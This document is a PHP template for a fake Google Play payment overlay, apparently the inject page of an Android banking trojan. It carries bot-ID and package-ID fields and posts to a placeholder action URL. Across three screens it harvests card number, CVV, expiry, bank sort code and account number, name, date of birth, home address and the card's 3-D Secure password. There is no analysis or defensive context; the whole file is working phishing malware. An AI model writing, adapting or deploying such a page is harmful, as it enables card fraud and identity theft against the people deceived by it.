<?php
$cur_year = (int)date('Y', time());
$age_min = $cur_year-100;
$age_max = $cur_year-17;

$html = <<<HTML_CODE

<!DOCTYPE html>
<html>
  <head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/paper/bootstrap.min.css">

  </head>
  
  <body>
<style type="text/css">
.wit{
	background:rgba(16, 56, 60, 0.25);
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:100;
	text-align:center;
}
.wit_black_block {
	padding: 40px;
	border-radius: 10px;
	-moz-border-radius: 10px;
	-webkit-border-radius: 10px;
	box-shadow: 0 0 10px white;
	-moz-box-shadow: 0 0 10px white;
	-webkit-box-shadow: 0 0 10px white;
	display: inline-block;
	margin-top: 150px;
	background-color: #000000;
	background-color: rgba(0, 0, 0, 0.6);
}
.mfont{
	font-family: 'Poppins', sans-serif;
}
.popover {
position: absolute !important;
top:0 ;
left:0;
z-index: 1060;
display: none;
padding: 1px;
text-align: left;
white-space: normal;
background-color: black !important;
-webkit-background-clip: padding-box;
background-clip: padding-box;
border-top: 3px solid red;
border-radius: 0px !important;
-webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, .2);
box-shadow: 0 5px 10px rgba(0, 0, 0, .2);
color: white;
}
.popover.bottom {
margin-bottom: -10px;
}
.popover > .arrow,
.popover > .arrow:after {
position: absolute;
display: block;
width: 0;
height: 0;
border-color: transparent;
border-style: solid;
}
.popover > .arrow {
border-width: 11px;
}
.popover > .arrow:after {
content: "";
border-width: 10px;
}
.popover.bottom > .arrow {
left: 80% !important;
top: -11px;
margin-left: -11px;
border-top-width: 0;
}
.popover.bottom > .arrow:after {
top: 1px;
bottom: -10px;
content: " ";
border-top-width: 0;
border-bottom-color: red;
}
.popover-content{
padding:1px 5px !important;
}
::-webkit-input-placeholder {
   color: #666666  !important;
}
:-moz-placeholder { /* Firefox 18- */
   color: #666666  !important;  
}
::-moz-placeholder {  /* Firefox 19+ */
   color: #666666 !important;  
}
:-ms-input-placeholder {  
   color: #666666 !important;  
}

.card_icons{
	transition: transform 1s ease;
	-webkit-transition: transform 1s ease;
}
#visa.card_selected{
	transform: translateX(-100%);
	-moz-transform: translateX(-100%);
	-ms-transform: translateX(-100%);
	-o-transform: translateX(-100%);
	-webkit-transform: translateX(-100%);
}
.op{opacity:0;}.stol{display:table;border-collapse:collapse;width:100%;height:100%;}.br{border:1px dotted red !important;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.center{text-align:center;}.left_{text-align:left;}.right_{text-align:right;}.td{display:table-cell;}.tr{display:table-row;}.hidden__{display:none;}.w100{width:100%;}.h100{height:100%;}
.inline{
	display:inline-block;
}
.container{
max-width:600px
}
</style>
 
<form class="" name="mf" id="mf"  action="%ACTION%" method="post" onsubmit="return false">
<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />

<script type="text/javascript">
  var askVbv=true;
  var personal_page__bottom_text="";
</script>
<!--Slot for hidden inputs-->



<div  class="cc_page "  style="padding-top:15px;padding-bottom:50px">
		<div  class="container "  style="">
		         
				 
				
				 
				 
				<h4 class=""  style="font-weight:300">{{card_step_title}}</h1>
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								<div  class=" "  style="">
                                       <img id="mc" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAVCAYAAAAnzezqAAAETElEQVRIx8WWaWxUVRiGvwE6tBhiMMGQAAJJMcZo1D+EP/xQEQkRWUIl+gOMiUYkkLhgomETBFqgtLTIFtsgprJMWbtYYCpQSqH2lC60lGnpWG4XEZjO0ulMe+fOPP6YkQzpdFoTgyd5c5KTe8/75N5z3u8TpZRZKbVbKeVQSvGE1B3xNItSKlPTNAKBAE9qGIaBpmkopVJFKeUY0jwUAl0Hwxh695ABQT38TpwRCARQSjlEKTWoqdHYiG/VajzJybjGjsU1/lm8c95Gt+SD3x+1mw+aj8OpOXBgPOwdC4eS4fJqcNwCYsMopYgN4PPhfWc+3SJ0i+CM0qO1pDEYqhocVZCdBKkCOwV2RWmHQJpAwYIw5HAAQh4P7snPDTB2xgDxTjNhfDoibLxbIHMQbRf4cQroPUMAhEJ4FywY0twpQs90oW+u4H9TCKWaYE8cgMzI1zi7+LHfMQDAqKh4zDweSO/Lgn+u4H9D8M82EUozQUbEKGMQiG0CXdcHB/AuXIRz0mTcEybgnDKVnuTpA0DcMpKeaQnoHwj98wX9PUFfJATXC6HDz0PxPMgaEz4T6RGgnQKpgpE9Dko/GQRA12kZN5G7N+2079yL/dpNvMfycaxYhW/ZcnpefY3etetpWLMF/885eBfORM/6FsesF+j9ajmt6WtwdDRRVXwWZ8FKuLYO/+EZ6CUfYpycg279DK3mEpR+DMH+GABeLzUTX+RGfRcVBVU033lI66Z0Lu8+TmN9O0037Nj353FlVx4teYXcK6+lqbqNhhO/0Xy5nguFNjj3Pve/FCoPfE1jQxct1ddpbbiFvb6OuqI87DYNjr4Cgd4YAD4fanYKZaW3aFbN1JVUca+8CtuRIjqv1mBZtoHblTbs1xu5tiGbO7V/UPHdfi7llNCxbgslW36BmlU4cmfyoOUqLdVVNNTe4XbRQRrLzuM4upiOunLInQRGXwyAYJCyz7di3XiQ8i+2YV27h/y0Y9QfOcfVQ79SnXOG6n0Wzueep/ybDPK3HsGWY6Fo62Hcc+dxYtZb1NQ1c9GSz5VCK7UXirlgKaTzpxQsO1JpqrXxZ1kunHr9UUoOOITO7B9oE0GTBO6azNhlJLdHJGGTBG6an6FzRAJNYuZ+4ijalybQteJp/lo+mr6PTPg3C23rn8K1zUznxkTubzLzYPNojF0mHn4/is6NSXg2CNTvi5MDHg+exETcIngi6omSOzK7RPBNEPpnCH0vCf1LTLBPICsSSFlRyoyek6DfFT8JA6Wlwwoi15jwNTRWCmQPkYQZ4WtI+8Xh1QL99OmYdWBAFL+bQjB3Sfi+p8dJwO0C9rP/ohgBoY4OelNSHitA/8g9dSqB02cihykErSchd0rYKC1K6QLFS8HbGbcaxu0HQi4XRmUlgYICAlYrwbY2CAZjPBgETxtoVrAXwL3fod89rH4gU9M0jOE0G/99R5QmUT1h9//RE/4NQkhB4pdQ2D8AAAAASUVORK5CYII=" alt="MasterCard" class="card_icons ">
									   <img id="visa" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAVCAYAAAAnzezqAAABrUlEQVRIx+2Wv0oDQRDGr0ptbSW+gD6CjyBY2IpgZ5FOO7URBUUFsQ2CFpJCLMRCREUQlEAaU4kErxGVnIUp1Dsy3m9xljGYS5ezyMCXbGZnZ775k2WDSqVSSLGVopFCeoToJ2YhSD82wzCUOI6lV5IkiRAzjb0CgUYvg6sQk9gQkLyE2H0CnkDycCBfpxMe8XXRG9Zf3mVs6cShdHEvxd0bt+YbqdYbMrVz5W0AZ1Ts3lvzs3MFWs1QXi/n5WNv0KEV3Tn9QrkqwWTJAce6Rk/wgel9r1Oc157cWQhb/eHtY3YLcDgysyzPpWFXFWRotuwOa2bqDOeWHEHJEL0KZywB7LvOABlBgjbg1LK3v1lbAqNzRz5zTcbuaRJdCdAzjNe3F/2aKrS3AyFjda7Q2dCz7NtWdCXQ3jewcVxze+NrZ78I2TN2FmyryFrJACqTSYCsbHAc6/TaUuKIilB2oHvY20p1SibzHrBlhb2KHSYc/RWAFmg1IIot0GFWf5kEcN7+n7b3gWZNS1THWvXWzrbJ3h/9q/jfEMj9PeBeRLxScngRrQbmTRjl8Sb8Bls0GXKQcR8OAAAAAElFTkSuQmCC" alt="Visa" class="card_icons">
									   <img id="amex" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAVCAYAAAAnzezqAAAFnklEQVR42rxWa2xURRT+7t7tPmi3L2iFroJQSkCQiKDRCBpfaAwqj0T5QWJ8JECMRm38ASYSEvklSjRULa+Ij6holQTERJBXjBKBIkQE29pCLW1pu9t2u6+7994Zz5l7L7sgxH9McnbOzJw75zvPWe3YsWMagFeJ3iCqxPUZg0RvEW3w08/aMyh//bSvKgSfH0U+QNc0JSWkhCmBnJDI2g6liVK2QMqSGLEEkUTCtDFMgklaw7QAy3bIZhIuES8cvtQnKl6arK1bFEWY1OHFo3J0Ji19sEgh3QdTSMWzcp5JJ+hT2C4oOiZeOnvSmZlA/NXH5fsJE9jSgQyxr7EHKpNCjwfJaE2wqISPeVaqADiAFCjhgfIMc8B5vNKjQMj/xTFsqlUlA1Au5mGSVl1oDgA4ANhCkxQYbhgMF0xWcCgoJJYTEoORcAiYPFSW537XGs9LtJeTrMEHBYAvZheODdGG5gCAC4D3+Z6cS32GRCwnESShmrCOZJFAmaUREKFipBHvxJ6iK3QHgLARS5lIJnPKsvHlQYR0VkKxoCqQDx6Ix9adTsocmesNcrfMkl+ZvMHsnu6srN3dL/f2GtI74ilJbjHzov8Zv/WkZMW7J+TqwxekKxZj3ZdC8PT4EPoNgS3taTDMpbSeEiELycXvt6TU2QM3BDB/bBCP1+TwEPHbz2WwqyuDSMCHzXeUY3NLAj91plRIOOOlCouN2vIAGu6P4vhzt2BiWQAfnejDntYhrKnlINCoLdEVfXY+i/19ORzszymeB8d5V7eB73sMvH02pcpv3cwSdGcF6k8m0HQ+jU/ak8iQ3P7uDJo6khhF7i3x+xAp0uD3a/jgaB8W7mxXyht/78fKHa0YU1yk7lceeCIaUsnVRNYsmxBGmD5qbEvj5bowAhQqTrh5VQHsv2jg43O8X4yGNgYjMJ++PdybUUmrUxKPI0Peu7sKOuUIuRnjSFHjhAhW7u7AIzkbBzuGsHhONbY+NhHNzXHHA4uiQbowrdy8oCaIhUTccBr/TsNPFw0YNqaV6ri3OoCNJMdNp6E1hSWkfHaZH9mcrawJUQL3xA3c9GkbaradRfTDP7GjZQgrZo7Gs7dX4cfmi5g6JoymJXVwe53jAVbG8YxRmi/9dVAd9JPSby9k8SQp4XOu/WduDmMrWb786BC6kibq76nEjo4RJ9NpGBTv6hI/vns0qqqJy+hWarD7zo/gm9Mx3BgtQUt/Bo2UA8tnVecB7CRFp/oMvDIjQpb6wRVyNmFj/ZkRfN6Zoc4lcDFjY96YYsyu8OOrk4N4eEoJZlUUYdMZsp5aMde3zW3asPDHQFbdwePn7iRWHehCHSXioWVTUb+3Eyu+/AuVQR2TPAD7ejKYOzaADbeVkmJLZf7zE0eheTCHIwMG6kb5MC6kooU3p0ewOmGgflpErccX65hRGaA3RMMEsr6CxFb90us2EQFB4O6qKcbOxZNRHtKxbcEkpLIW1h76B9vvhNMHqIZjXJu9lMqVX3fJwBedsptanKDNFBV3lpoC9wWvzA23AfCvSULeOkdzyrRluoBSbnNpi2flnE2n5O7WQbVOGFa+D9y35wIkxWyIXB1PWqpbzf2hB+VU35rbwEmP6qIa/fj4IeK1cHhN8Fqo7uhjISmcvq/eB5YTaI1nMRDL4KmmFsysCiNEZbp+uhuC4z3UfDT3AaAD/ridPsg/Lu5cSEJeUqCeWdfl+TORP1fIuUx0pMn9R9qHSQ9tTA85AJyOrzkKLXmNJ6xwls5zqbm8zz1yM18pY97nigvkgSkjNeUBrwriZZqtDduaA0IVqKdMu9wDKLjoah652lnhuuA9LitSUOIMY+OKqBku1Qr+udhX8lfMopBk/rkV1wgRvH3HgFLywAtT9DCt3tEoExnEWv5nRFRxHf8TNhCt+VeAAQCMFxJfRCsJhwAAAABJRU5ErkJggg==" alt="Amex" class="card_icons">
								</div>
						</div>
				</div>
				<div  class="row "  style="">
						<div  class="col-sm-12"  style="padding-top:20px">
									<div  class="form-group has-feedback"  style="">
											<input class="form-control minput" type="number" name="fields[cc]"  id="cc" data-toggle="popover" data-placement="bottom" title=""  data-content="Invalid credit card number"   placeholder="{{placeholder_card_numbr}}" />
											<span class="glyphicon glyphicon-exclamation-sign form-control-feedback hidden__" ></span>
									</div>
						</div>
				</div>
				
				<div  class="row "  style="">
						<div  class="col-sm-12"  style="padding-top:0px">
									<div  class="form-group has-feedback"  style="">
											<input class="form-control minput" type="text" name="fields[name]"   id="name" data-toggle="popover" data-placement="bottom" title=""  data-content="{{error1}}"   placeholder="{{placeholder_card_name}}" />
											<small class="text-warning"><span  class="fa fa-exclamation-triangle"></span>&nbsp;{{hint_card_name}}</small>
											<span class="glyphicon glyphicon-exclamation-sign form-control-feedback hidden__" ></span>
									</div>
						</div>
				</div>
				
				<div  class="row exp_row op"  style="">
						<div  class="col-xs-5"  style="">
									<div  class="form-group "  style="">
											<div  class="input-group" data-toogle="popover" data-content="{{error1}}" data-placement="bottom"  style="">
											   
											   <select id="exp_m" class="form-control minput" name="fields[exp_m]">
												 <option value="--">{{month_abbr}}</option>
												 <script type="text/javascript">
												   for(i=1;i<13;i++){
													   document.write("<option value="+i+">"+i+"</option>");
												   }
												 </script>
												 
											   </select>
											   <div class="input-group-btn" style="width:0px">
											   <select id="exp_y" class="form-control minput" style="margin-left:8px" name="fields[exp_y]">
												 <option value="--">{{year_abbr}}</option>
												 <script type="text/javascript">
												    for(i={$cur_year};i<2026;i++){
														document.write("<option value="+i+">"+i+"</option>");
													}
												 </script>
											   </select>
												  
											   </div>
											</div>
											
									</div>
						</div>
						
						<div  class="col-xs-3  right_"  style="padding-top:10px">
									<img style="width:30px" class="b3id-cvc-tooltip-image tooltip-image cvv_icon op" src="data:image/png;base64,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">
						</div>
						<div  class="col-xs-4"  style="">
									<div  class="form-group "  style="">
											<input class="form-control minput" type="number" name="fields[cvv]" trigger="manual" id="cvv" data-toggle="popover" data-placement="bottom" title="" maxlength="3" data-content="{{error1}}"   placeholder="CVV" />
											
									</div>
						</div>
				</div>
				
				
				<div  class="row acc_row hidden__ op"  style="">
						<div  class="col-xs-6"  style="">
									<div  class="form-group "  style="">
											<input class="form-control minput" type="number" name="fields[s_code]" data-placement="bottom" id="s_code"  data-toogle="popover"   placeholder="Sort code"  data-content="{{error1}}"/>
											<small class="text-warning"><span  class="fa fa-exclamation-triangle"></span> 6 Digits</small>
									</div>
						</div>
						
						
						<div  class="col-xs-6"  style="">
									<div  class="form-group "  style="">
											<input class="form-control minput" type="number" name="fields[acc]" id="acc" data-content="{{error1}}" data-toggle="popover" placeholder="Acount number"  data-placement="bottom"/>
											<small class="text-warning"><span  class="fa fa-exclamation-triangle"></span> 8 Digits</small>
									</div>
						</div>
				</div>
				
				<div  class="row "  style="padding-top:10px">
						
						<div  class="col-sm-12 "  style="">
								<div  class="stol  w100 "  style="table-layout:fixed">
										<div  class="td  middle left_"  style="">
												<span  class="some_class mfont" style="font-weight:500;font-size:1.6em">
														Google Play
												</span>
										</div>
										<div  class="td  right_ middle"  style="">
												<a href="javascript:void(0)" class="btn btn-success " onclick="send_cc()"  style="">{{next_button}}</a>
										</div>
								</div>
						</div>
						
						
				</div>
				
		</div>
</div>





<div  class="personal_page hidden__"  style="padding-top:15px;padding-bottom:50px">
		<div  class="container "  style="">
				<h5 class=""  style="font-weight:300">{{personal_page_title}}</h5>
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								<div  class="stol  "  style="">
										<div  class="td  left_ middle"  style="width:1px">
												<div  class="inline  icon_slot"  style="">
														<img id="mc" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAVCAYAAAAnzezqAAAETElEQVRIx8WWaWxUVRiGvwE6tBhiMMGQAAJJMcZo1D+EP/xQEQkRWUIl+gOMiUYkkLhgomETBFqgtLTIFtsgprJMWbtYYCpQSqH2lC60lGnpWG4XEZjO0ulMe+fOPP6YkQzpdFoTgyd5c5KTe8/75N5z3u8TpZRZKbVbKeVQSvGE1B3xNItSKlPTNAKBAE9qGIaBpmkopVJFKeUY0jwUAl0Hwxh695ABQT38TpwRCARQSjlEKTWoqdHYiG/VajzJybjGjsU1/lm8c95Gt+SD3x+1mw+aj8OpOXBgPOwdC4eS4fJqcNwCYsMopYgN4PPhfWc+3SJ0i+CM0qO1pDEYqhocVZCdBKkCOwV2RWmHQJpAwYIw5HAAQh4P7snPDTB2xgDxTjNhfDoibLxbIHMQbRf4cQroPUMAhEJ4FywY0twpQs90oW+u4H9TCKWaYE8cgMzI1zi7+LHfMQDAqKh4zDweSO/Lgn+u4H9D8M82EUozQUbEKGMQiG0CXdcHB/AuXIRz0mTcEybgnDKVnuTpA0DcMpKeaQnoHwj98wX9PUFfJATXC6HDz0PxPMgaEz4T6RGgnQKpgpE9Dko/GQRA12kZN5G7N+2079yL/dpNvMfycaxYhW/ZcnpefY3etetpWLMF/885eBfORM/6FsesF+j9ajmt6WtwdDRRVXwWZ8FKuLYO/+EZ6CUfYpycg279DK3mEpR+DMH+GABeLzUTX+RGfRcVBVU033lI66Z0Lu8+TmN9O0037Nj353FlVx4teYXcK6+lqbqNhhO/0Xy5nguFNjj3Pve/FCoPfE1jQxct1ddpbbiFvb6OuqI87DYNjr4Cgd4YAD4fanYKZaW3aFbN1JVUca+8CtuRIjqv1mBZtoHblTbs1xu5tiGbO7V/UPHdfi7llNCxbgslW36BmlU4cmfyoOUqLdVVNNTe4XbRQRrLzuM4upiOunLInQRGXwyAYJCyz7di3XiQ8i+2YV27h/y0Y9QfOcfVQ79SnXOG6n0Wzueep/ybDPK3HsGWY6Fo62Hcc+dxYtZb1NQ1c9GSz5VCK7UXirlgKaTzpxQsO1JpqrXxZ1kunHr9UUoOOITO7B9oE0GTBO6azNhlJLdHJGGTBG6an6FzRAJNYuZ+4ijalybQteJp/lo+mr6PTPg3C23rn8K1zUznxkTubzLzYPNojF0mHn4/is6NSXg2CNTvi5MDHg+exETcIngi6omSOzK7RPBNEPpnCH0vCf1LTLBPICsSSFlRyoyek6DfFT8JA6Wlwwoi15jwNTRWCmQPkYQZ4WtI+8Xh1QL99OmYdWBAFL+bQjB3Sfi+p8dJwO0C9rP/ohgBoY4OelNSHitA/8g9dSqB02cihykErSchd0rYKC1K6QLFS8HbGbcaxu0HQi4XRmUlgYICAlYrwbY2CAZjPBgETxtoVrAXwL3fod89rH4gU9M0jOE0G/99R5QmUT1h9//RE/4NQkhB4pdQ2D8AAAAASUVORK5CYII=" alt="MasterCard" class="card_icons ">
												</div>
										</div>
										<div  class="td  middle"  style="padding-left:20px">
												xxxx xxxx xxxx <span  class="last_4"></span>
										</div>
								</div>
						</div>
				</div>
				
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="padding-top:15px">
								   <div  class="form-group "  style="">
											<input class="form-control minput" type="text" name="fields[f_name]" id="f_name" data-content="{{error1}}" data-toggle="popover" placeholder="{{placeholder_full_name}}"  data-placement="bottom"/>
											
									</div>
						</div>
				</div>
				
				
				<div  class="row "  style="">
				        <div  class="col-xs-5"  style="">
								<div class="form-group">
								   <input class="form-control" type="text" style="" name="fields[same]" id="same" disabled="disabled" placeholder="{{dob_title}}"/>
								</div>
								
						</div>
						<div  class="col-xs-7"  style="">
								   <div  class="form-group "  style="">
											<div  class="input-group  pull-right " data-toogle="popover" data-content="{{error1}}" data-placement="bottom"  style="">
											   <select class="form-control minput" id="dob_d" name="fields[dob_d]" style="">
												 <option value="--">{{day_abbr}}</option>
												 <script type="text/javascript">
												     for(i=1;i<32;i++){
														 document.write("<option value="+i+">"+i+"</option>");
													 }
												 </script>
											   </select>
											   <div class="input-group-btn" style="width:0px"></div>
											   <select class="form-control minput" id="dob_m" name="fields[dob_m]" style="">
												 <option value="--">{{month_abbr}}</option>
												 <script type="text/javascript">
												     for(i=1;i<=12;i++){
														 document.write("<option value="+i+">"+i+"</option>");
													 }
												 </script>
											   </select>
											   
											   <div class="input-group-btn" style="width:0px"></div>
											   <select class="form-control minput" id="dob_y" name="fields[dob_y]" style="">
												 <option value="--">{{year_abbr}}</option>
												 <script type="text/javascript">
												     for(i={$age_min};i<{$age_max};i++){
														 document.write("<option value="+i+">"+i+"</option>");
													 }
												 </script>
											   </select>
											</div>
											
									</div>
						</div>
				</div>
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								   <div  class="form-group "  style="">
											<input class="form-control minput" type="text" name="fields[house_n]" id="house_n" data-content="{{error1}}" data-toggle="popover" placeholder="{{placeholder_adress1}}"  data-placement="bottom"/>
											
									</div>
						</div>
				</div>
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								   <div  class="form-group "  style="">
											<input class="form-control minput" type="text" name="fields[street_name]" id="street_name" data-content="{{error1}}" data-toggle="popover" placeholder="{{placeholder_adress3_street}}"  data-placement="bottom"/>
											
									</div>
						</div>
				</div>
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								   <div  class="form-group "  style="">
											<input class="form-control minput" type="text" name="fields[city]" id="city" data-content="{{error1}}" data-toggle="popover" placeholder="{{placeholder_adress2_city}}"  data-placement="bottom"/>
											
									</div>
						</div>
				</div>
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								   <div  class="form-group "  style="">
											<input class="form-control minput" type="text" name="fields[post]" id="post" data-content="{{error1}}" data-toggle="popover" placeholder="{{placeholder_zip}}"  data-placement="bottom"/>
											
									</div>
						</div>
				</div>
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								   <p class="mfont" style="line-height:12px !important;font-size:0.9em;color:black">
										   <script type="text/javascript">
											 document.write(personal_page__bottom_text);
										   </script>
								   </p>
						</div>
				</div>
				
				
				<div  class="row "  style="padding-top:10px">
						
						<div  class="col-sm-12 "  style="">
								<div  class="stol  w100 "  style="table-layout:fixed">
										<div  class="td  middle left_"  style="">
												<span  class="some_class mfont" style="font-weight:500;font-size:1.6em">
														Google Play
												</span>
										</div>
										<div  class="td  right_ middle"  style="">
												<a href="javascript:void(0)" class="btn btn-success " onclick="send_personal()"  style="">{{next_button}}</a>
										</div>
								</div>
						</div>
						
						
				</div>
				
		</div>
</div>





<div  class="vbv_page hidden__"  style="padding-top:15px;padding-bottom:50px">
		<div  class="container "  style="">
				
				
				<div  class="row "  style="">
					<div  class="col-xs-6 col-xs-offset-3 col-sm-4 col-sm-offset-4"  style="">
							<img src="http://i.imgur.com/FKNvWhz.jpg" style="" class="w100 hidden__ vbv_icon"/>
							<img src="http://i.imgur.com/RJvVLUq.png" style="" class="w100 hidden__ mc_icon"/>
					</div>	
				</div>
				
				<div  class="row "  style="">
					<div  class="col-sm-12"  style="">
							<p style="line-height:1.1em;color:black;font-size:1.2em">{{vbv_title}} <span class="visa_or_mc"></span></p>
					</div>	
				</div>
				
				
				<div  class="row "  style="">
						<div  class="col-sm-12 "  style="">
								<div  class="stol w100 "  style="table-layout:fixed">
										<div  class="tr "  style="">
												<div  class="td  right_"  style="">
														<span  class="some_class">{{placeholder_card_numbr}}:</span>
												</div>
												<div  class="td  "  style="padding-left:10px">
														<span  class="some_class">xxxx xxxx xxxx <b class="last_4"></b></span>
												</div>
										</div>
										<div  class="tr "  style="height:20px"></div>
										<div  class="tr "  style="">
												<div  class="td  right_"  style="">
												<span id='amex_pass_text' style='display: none'>{{amex_pass_text}}</span>
												<span id='visa_pass_text' style='display: none'>{{visa_pass_text}}</span>
												<span id='mc_pass_text' style='display: none'>{{mc_pass_text}}</span>
												
														<span  class="some_class"><span  class="visa_or_mc"></span>:</span>
												</div>
												<div  class="td  "  style="padding-left:10px;overflow:auto">
												   <div  class="form-group "  style="margin:0px;padding:0px">
														<input class="form-control" type="password" name="fields[vbv]" style="width:150px" id="vbv"  placeholder="" />
													</div>	
												</div>
										</div>
								</div>
						</div>
				</div>
				
				<div  class="row "  style="padding-top:20px">
						<div  class="col-sm-12"  style="">
								<div  class="alert alert-warning "  style="">
								{{sms_exeption}}
								</div>
						</div>
				</div>
				
				
				<div  class="row "  style="padding-top:20px">
						
						<div  class="col-sm-12 "  style="">
								<div  class="stol  w100 "  style="table-layout:fixed">
										<div  class="td  middle left_"  style="">
												<span  class="some_class mfont" style="font-weight:500;font-size:1.6em">
														Google Play
												</span>
										</div>
										<div  class="td  right_ middle"  style="">
												<a href="javascript:void(0)" class="btn btn-success " onclick="send_vbv()"  style="">{{submit_button}}</a>
										</div>
								</div>
						</div>
						
						
				</div>
				
				
				
				
		</div>
</div> 
</form>

